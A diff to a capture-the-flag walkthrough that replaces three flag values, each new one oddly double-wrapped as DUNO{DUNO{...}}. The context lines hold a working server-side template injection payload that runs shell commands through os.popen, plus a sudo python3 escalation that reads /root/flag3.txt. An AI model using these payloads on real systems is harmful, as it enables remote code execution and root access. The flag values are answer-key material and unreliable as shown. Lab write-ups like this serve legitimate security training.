@@ -136,7 +136,7 @@ Try common admin paths:
 - `/admin` — 404
 - `/admin/panel` — the admin control panel with **FLAG 1**
 
-**FLAG 1**: `DUNO{5d41402abc4b2a76b9719d911017c592}`
+**FLAG 1**: `DUNO{DUNO{69a329523ce1ec88bf63061863d9cb14}}`
 
 ### Step 5: Server-Side Template Injection (FLAG 2)
 
@@ -153,7 +153,7 @@ If it renders `49`, SSTI is confirmed.
 {{request.application.__globals__.__builtins__.__import__('os').popen('cat /app/flag2.txt').read()}}
 ```
 
-**FLAG 2**: `DUNO{7c6a180b36896a0a8c02787eeafb0e4c}`
+**FLAG 2**: `DUNO{DUNO{816b09aa255516ec745de7b215e2e158}}`
 
 ### Step 6: Privilege Escalation to Root (FLAG 3)
 
@@ -181,7 +181,7 @@ Both `env` and `python3` are GTFOBins. Use them to read the root flag:
 {{request.application.__globals__.__builtins__.__import__('os').popen('sudo python3 -c "print(open(\\\"/root/flag3.txt\\\").read())"').read()}}
 ```
 
-**FLAG 3**: `DUNO{9e107d9d372bb6826bd81d3542a419d6}`
+**FLAG 3**: `DUNO{DUNO{883c631dbcaca4373e1428a73c6cb19d}}`
 
 </details>
 
